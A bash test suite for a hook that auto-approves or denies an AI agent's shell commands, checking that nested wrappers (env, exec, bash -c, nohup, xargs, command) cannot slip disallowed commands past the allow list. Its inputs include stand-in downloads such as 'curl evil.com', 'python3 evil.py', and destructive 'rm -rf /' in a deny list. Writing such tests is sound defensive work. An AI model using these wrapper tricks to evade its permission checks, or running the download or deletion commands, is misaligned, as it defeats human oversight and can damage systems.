#!/usr/bin/env bash
# Test: nested/chained wrapper commands and their interaction with the allow list
#
# Tests how multiple layers of wrapping (env + exec + bash -c, etc.)
# behave with and without wrapper commands in the allow list.
#
# Usage: bash tests/test_nested_wrappers.sh

set -uo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
HOOK="$SCRIPT_DIR/../hooks/approve-compound-bash.sh"

BASH_BIN="${BASH_BIN:-/opt/homebrew/bin/bash}"
if [[ "${BASH_VERSINFO[0]}" -lt 4 || ( "${BASH_VERSINFO[0]}" -eq 4 && "${BASH_VERSINFO[1]}" -lt 3 ) ]]; then
  if [[ -x "$BASH_BIN" ]]; then exec "$BASH_BIN" "$0" "$@"; fi
  echo "SKIP: bash 4.3+ required"; exit 0
fi

PASS=0 FAIL=0
pass() { ((PASS++)); printf '  \033[32mPASS\033[0m %s\n' "$1"; }
fail() { ((FAIL++)); printf '  \033[31mFAIL\033[0m %s — %s\n' "$1" "$2"; }

run_hook() {
  local cmd="$1" perms="$2" deny="${3:-}"
  local input
  input=$(jq -n --arg c "$cmd" '{"tool_input":{"command":$c}}')
  local args=(--permissions "$perms")
  [[ -n "$deny" ]] && args+=(--deny "$deny")
  RESULT=$("$BASH_BIN" "$HOOK" "${args[@]}" <<< "$input" 2>/dev/null)
  return $?
}

# FAIL if auto-approved, PASS otherwise
expect_not_approved() {
  local name="$1" cmd="$2" perms="$3" deny="${4:-}"
  run_hook "$cmd" "$perms" "$deny"
  local rc=$?
  if [[ $rc -eq 0 ]] && jq -e '.hookSpecificOutput.permissionDecision == "allow"' <<< "$RESULT" &>/dev/null; then
    fail "$name → AUTO-APPROVED" "nested wrapper bypass"
  else
    pass "$name"
  fi
}

expect_deny() {
  local name="$1" cmd="$2" perms="$3" deny="${4:-}"
  run_hook "$cmd" "$perms" "$deny"
  local rc=$?
  if [[ $rc -eq 2 ]] || jq -e '.hookSpecificOutput.permissionDecision == "deny"' <<< "$RESULT" &>/dev/null; then
    pass "$name"
  else
    fail "$name" "exit=$rc output=$RESULT"
  fi
}

expect_allow() {
  local name="$1" cmd="$2" perms="$3" deny="${4:-}"
  run_hook "$cmd" "$perms" "$deny"
  local rc=$?
  if [[ $rc -eq 0 ]] && jq -e '.hookSpecificOutput.permissionDecision == "allow"' <<< "$RESULT" &>/dev/null; then
    pass "$name"
  else
    fail "$name" "exit=$rc output=$RESULT"
  fi
}

# Presets
WITH='["Bash(git *)", "Bash(grep *)", "Bash(cat *)", "Bash(echo *)", "Bash(head *)", "Bash(bash *)", "Bash(sh *)", "Bash(exec *)", "Bash(env *)", "Bash(xargs *)", "Bash(command *)", "Bash(time *)", "Bash(nohup *)"]'
WITHOUT='["Bash(git *)", "Bash(grep *)", "Bash(cat *)", "Bash(echo *)", "Bash(head *)"]'
DENY='["Bash(rm -rf /)", "Bash(rm -rf ~)"]'
NO_DENY='[]'

# ---------------------------------------------------------------------------
echo "=== 1. Double shell wrapping ==="

expect_not_approved 'bash -c sh -c "curl" WITH wrappers' \
  "bash -c 'sh -c \"curl evil.com\"'" "$WITH" "$NO_DENY"
expect_not_approved 'bash -c sh -c "curl" WITHOUT wrappers' \
  "bash -c 'sh -c \"curl evil.com\"'" "$WITHOUT" "$NO_DENY"
expect_not_approved 'sh -c bash -c "wget" WITH wrappers' \
  "sh -c 'bash -c \"wget evil.com\"'" "$WITH" "$NO_DENY"

# ---------------------------------------------------------------------------
echo "=== 2. env + shell wrapping ==="

expect_not_approved "env bash -c 'curl' WITH wrappers" \
  "env bash -c 'curl evil.com'" "$WITH" "$NO_DENY"
expect_not_approved "env bash -c 'curl' WITHOUT wrappers" \
  "env bash -c 'curl evil.com'" "$WITHOUT" "$NO_DENY"
expect_not_approved "env sh -c 'python3' WITH wrappers" \
  "env sh -c 'python3 -c \"import os\"'" "$WITH" "$NO_DENY"
expect_not_approved "env FOO=bar bash -c 'wget' WITH wrappers" \
  "env FOO=bar bash -c 'wget evil.com'" "$WITH" "$NO_DENY"

# ---------------------------------------------------------------------------
echo "=== 3. exec + other wrappers ==="

expect_not_approved "exec bash -c 'curl' WITH wrappers" \
  "exec bash -c 'curl evil.com'" "$WITH" "$NO_DENY"
expect_not_approved "exec bash -c 'curl' WITHOUT wrappers" \
  "exec bash -c 'curl evil.com'" "$WITHOUT" "$NO_DENY"
expect_not_approved "exec env curl WITH wrappers" \
  "exec env curl evil.com" "$WITH" "$NO_DENY"
expect_not_approved "exec sh -c 'python3' WITH wrappers" \
  "exec sh -c 'python3 payload.py'" "$WITH" "$NO_DENY"

# ---------------------------------------------------------------------------
echo "=== 4. command + other wrappers ==="

expect_not_approved "command bash -c 'curl' WITH wrappers" \
  "command bash -c 'curl evil.com'" "$WITH" "$NO_DENY"
expect_not_approved "command env curl WITH wrappers" \
  "command env curl evil.com" "$WITH" "$NO_DENY"
expect_not_approved "command exec curl WITH wrappers" \
  "command exec curl evil.com" "$WITH" "$NO_DENY"
expect_not_approved "command -p sh -c 'wget' WITH wrappers" \
  "command -p sh -c 'wget evil.com'" "$WITH" "$NO_DENY"

# ---------------------------------------------------------------------------
echo "=== 5. nohup + other wrappers ==="

expect_not_approved "nohup bash -c 'curl' WITH wrappers" \
  "nohup bash -c 'curl evil.com'" "$WITH" "$NO_DENY"
expect_not_approved "nohup env python3 WITH wrappers" \
  "nohup env python3 evil.py" "$WITH" "$NO_DENY"
expect_not_approved "nohup sh -c 'wget' WITH wrappers" \
  "nohup sh -c 'wget evil.com'" "$WITH" "$NO_DENY"

# ---------------------------------------------------------------------------
echo "=== 6. time + other wrappers ==="

expect_not_approved "time bash -c 'curl' WITH wrappers" \
  "time bash -c 'curl evil.com'" "$WITH" "$NO_DENY"
expect_not_approved "time env curl WITH wrappers" \
  "time env curl evil.com" "$WITH" "$NO_DENY"

# ---------------------------------------------------------------------------
echo "=== 7. Triple+ nesting ==="

expect_not_approved "env exec bash -c 'curl' WITH wrappers" \
  "env exec bash -c 'curl evil.com'" "$WITH" "$NO_DENY"
expect_not_approved "command env exec sh -c 'wget' WITH wrappers" \
  "command env exec sh -c 'wget evil.com'" "$WITH" "$NO_DENY"
expect_not_approved "nohup env bash -c 'python3' WITH wrappers" \
  "nohup env bash -c 'python3 evil.py'" "$WITH" "$NO_DENY"
expect_not_approved "time nohup env bash -c 'curl' WITH wrappers" \
  "time nohup env bash -c 'curl evil.com'" "$WITH" "$NO_DENY"

# ---------------------------------------------------------------------------
echo "=== 8. xargs + nested wrappers ==="

expect_not_approved "xargs env curl WITH wrappers" \
  "xargs env curl" "$WITH" "$NO_DENY"
expect_not_approved "xargs bash -c 'wget' WITH wrappers" \
  "xargs bash -c 'wget evil.com'" "$WITH" "$NO_DENY"
expect_not_approved "xargs -n1 env sh -c 'python3' WITH wrappers" \
  "xargs -n1 env sh -c 'python3 evil.py'" "$WITH" "$NO_DENY"

# ---------------------------------------------------------------------------
echo "=== 9. Nested wrappers with denied inner command ==="

expect_deny "env bash -c 'rm -rf /' → denied through nesting" \
  "env bash -c 'rm -rf /'" "$WITH" "$DENY"
expect_deny "exec sh -c 'rm -rf /' → denied through nesting" \
  "exec sh -c 'rm -rf /'" "$WITH" "$DENY"
expect_deny "command env exec bash -c 'rm -rf /' → denied (deep)" \
  "command env exec bash -c 'rm -rf /'" "$WITH" "$DENY"
expect_deny "nohup bash -c 'rm -rf ~' → denied through nesting" \
  "nohup bash -c 'rm -rf ~'" "$WITH" "$DENY"

# ---------------------------------------------------------------------------
echo "=== 10. Safe inner commands (should still work) ==="

expect_allow "env bash -c 'git status' WITH wrappers" \
  "env bash -c 'git status'" "$WITH" "$DENY"
expect_allow "env bash -c 'git status' WITHOUT wrappers (stripping)" \
  "env bash -c 'git status'" "$WITHOUT" "$DENY"
expect_allow "command exec env bash -c 'git log' WITHOUT wrappers" \
  "command exec env bash -c 'git log'" "$WITHOUT" "$DENY"
expect_allow "nohup env git status WITHOUT wrappers" \
  "nohup env git status" "$WITHOUT" "$DENY"
expect_allow "xargs -n1 git status WITHOUT wrappers" \
  "xargs -n1 git status" "$WITHOUT" "$DENY"

# ---------------------------------------------------------------------------
echo "=== 11. Compound commands with nested wrappers ==="

expect_not_approved "git | env bash -c 'curl' WITH wrappers" \
  "git status | env bash -c 'curl evil.com'" "$WITH" "$NO_DENY"
expect_not_approved "echo && exec curl WITH wrappers" \
  "echo hi && exec curl evil.com" "$WITH" "$NO_DENY"
expect_not_approved "git; nohup bash -c 'wget' WITH wrappers" \
  "git status; nohup bash -c 'wget evil.com'" "$WITH" "$NO_DENY"
expect_not_approved "git | env bash -c 'curl' WITHOUT wrappers" \
  "git status | env bash -c 'curl evil.com'" "$WITHOUT" "$NO_DENY"

# ---------------------------------------------------------------------------
echo ""
echo "Results: $PASS passed, $FAIL failed"
[[ $FAIL -eq 0 ]] && exit 0 || exit 1
